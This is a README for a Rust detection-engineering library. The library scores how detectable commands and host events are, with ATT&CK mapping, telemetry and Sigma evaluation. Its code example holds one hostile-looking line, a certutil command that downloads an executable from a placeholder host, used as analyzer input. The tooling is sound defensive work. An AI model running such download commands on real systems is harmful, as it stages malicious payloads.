# opseclint-core

[![Crates.io](https://img.shields.io/crates/v/opseclint-core.svg?style=flat-square)](https://crates.io/crates/opseclint-core)
[![Docs.rs](https://img.shields.io/docsrs/opseclint-core?style=flat-square)](https://docs.rs/opseclint-core)
[![MIT License](https://img.shields.io/crates/l/opseclint-core.svg?style=flat-square)](../../LICENSE)

The knowledge base and evaluator behind [opseclint](https://github.com/ezekiellabs/opseclint),
as a library. *"what would a defender see?"*

Give it a command, a script, or a recorded host event, and it answers three
questions: which ATT&CK technique(s) the action implements, what host telemetry
it emits, and which detections would fire — with a 0–100 detectability score.
Linux/auditd, Windows/Sysmon, macOS/Endpoint Security.

This is the substrate the `opseclint` binary is built on, published separately
so other tools can build on the same data rather than fork it: a SIEM
enrichment step, a notebook, an MCP server, an agent that needs ground truth
about what its stack can actually see.

## Install

```sh
cargo add opseclint-core
```

## Analyze a command

```rust
use opseclint_core::{analyzer, kb, Platform};

let kb = kb::load(Platform::WindowsSysmon)?;
let report = analyzer::analyze("certutil -urlcache -f http://x/a.exe a.exe", &kb);

for finding in &report.findings {
    println!("{} ({})", finding.description, finding.severity.label());
    for t in &finding.techniques {
        println!("  {} {}", t.id, t.name);
    }
    for signal in &finding.telemetry {
        println!("  emits: {signal}");
    }
}
```

Every platform's knowledge base is embedded at compile time, so `kb::load` does
no I/O and the crate has no runtime data dependency.

## What's in it

| Module       | What it does                                                                   |
| ------------ | ------------------------------------------------------------------------------ |
| `kb`         | Loads the embedded knowledge base for a platform                               |
| `model`      | The KB schema and the analysis result types (`Finding`, `Report`, `Severity`)  |
| `parser`     | Shell-aware command parsing — pipelines, redirections, argument resolution     |
| `matcher`    | The structured `match` engine a KB entry uses to claim a command line          |
| `analyzer`   | Walks input, resolves each action against the KB, produces a `Report`          |
| `sigma`      | Indexes a real SigmaHQ checkout and enriches a report from it                  |
| `sigma_eval` | Evaluates a Sigma rule's `detection:`/`condition:` logic, three-valued         |
| `telemetry`  | Ingests recorded Sysmon / auditd / ESF events back into the same `Report`      |
| `edr`        | Maps native telemetry to the sensor events CrowdStrike / Defender / S1 / Elastic surface |

## Uncertainty is a value, not an absence

`sigma_eval` is three-valued on purpose. A command line is not a host event, so
a rule keyed on a field the input cannot carry — `ParentImage`, a hash, a
registry value — evaluates to `INDETERMINATE`, never to "no".

Treat that verdict as its own answer. Rounding it to *not detected* is the one
misuse of this crate that turns a careful result into a false claim of stealth,
and it is the failure mode this whole project exists to argue against. Absence
of a finding is not evidence of stealth either: the knowledge base models a
bounded set of actions, and `kb::load` tells you which platform you asked
about, not that the platform is fully mapped.

## Feature flags

| Feature | Default | What it adds                                                                                              |
| ------- | ------- | --------------------------------------------------------------------------------------------------------- |
| `clap`  | off     | `clap::ValueEnum` on `Platform`, `telemetry::Format`, and `edr::Vendor`, for consumers that accept them as flag values |

## Scope

This crate describes *detectability* only. It encodes no evasion semantics and
recommends none — the same commitment the CLI ships under.

## License

MIT. See [LICENSE](../../LICENSE).
